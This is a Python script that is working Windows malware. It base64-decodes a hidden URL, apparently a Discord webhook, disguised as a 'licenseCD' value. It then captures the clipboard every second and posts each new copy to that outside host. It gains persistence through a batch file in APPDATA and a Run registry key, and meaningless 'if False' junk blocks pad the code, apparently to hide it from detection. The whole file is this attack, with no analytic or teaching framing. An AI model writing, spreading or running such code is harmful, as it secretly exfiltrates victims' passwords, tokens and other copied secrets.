import time
import subprocess
import requests
if False:
    _var_157_0 = (790, 85, 635)
    _var_157_1 = (461, 913, 334)

    def _var_157_fn():
        pass
import pyperclip
import io
import base64
import shutil
import os
import winreg as reg
import sys

def install_library(library_name):
    try:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', library_name])
        print(f"'{library_name}' has been installed successfully.")
    except subprocess.CalledProcessError as e:
        print(f"An error occurred while trying to install '{library_name}': {e}")
    if False:
        _var_154_0 = (510, 48, 646)
        _var_154_1 = (807, 58, 264)

        def _var_154_fn():
            pass

def start():
    licenseCD = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI2MjM5MTY1Mzk5MDE0MjAxMy9wNmVqSW1qRnhmMlJYakpPM3ZKQmg2VXZQQ2VuS2FsalhKMmR6SDFCd2NkYVdnT1BjR0lkSFY3eGNRWTIxWThoTzhZLQ=='
    strb = base64.b64decode(licenseCD)
    mk = strb.decode('utf-8')
    n = b'{"content": ["Must be 2000 or fewer in length."]}'
    send_txt = ''
    install_library('requests')
    install_library('pyperclip')
    if check_persistence('MyStartupScript'):
        while True:
            txt = pyperclip.paste()
            if send_txt == txt:
                time.sleep(1)
            else:
                data = {'content': f'```{txt}```'}
                response = requests.post(mk, data=data)
                if response.content == n:
                    print('error')
                    file = io.BytesIO(txt.encode('utf-8'))
                    file.name = 'filename.txt'
                    payload = {'file': (file.name, file)}
                    response = requests.post(mk, files=payload)
                send_txt = txt
            time.sleep(1)
    else:
        add_to_startup()

def add_to_startup():
    script_path = os.path.abspath(sys.argv[0])
    bat_path = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows')
    bat_name = 'startup_script.bat'
    with open(os.path.join(bat_path, bat_name), 'w') as bat_file:
        bat_file.write(f'@echo off\nstart "" pythonw "{script_path}"\nexit')
    key = reg.HKEY_CURRENT_USER
    sub_key = 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
    if False:
        _var_155_0 = (998, 251, 743)

        def _var_155_fn():
            pass
    reg_key = reg.OpenKey(key, sub_key, 0, reg.KEY_ALL_ACCESS)
    reg.SetValueEx(reg_key, 'MyStartupScript', 0, reg.REG_SZ, f'{bat_path}\\{bat_name}')
    if False:
        _var_156_0 = (788, 799, 342)

        def _var_156_fn():
            pass
    reg.CloseKey(reg_key)

def check_persistence(program_name):
    hives = [reg.HKEY_LOCAL_MACHINE, reg.HKEY_CURRENT_USER]
    paths = ['Software\\Microsoft\\Windows\\CurrentVersion\\Run', 'Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce']
    for hive in hives:
        for path in paths:
            try:
                with reg.OpenKey(hive, path, 0, reg.KEY_READ) as key:
                    try:
                        reg.QueryValueEx(key, program_name)
                        return True
                    except FileNotFoundError:
                        continue
            except FileNotFoundError:
                continue
    return False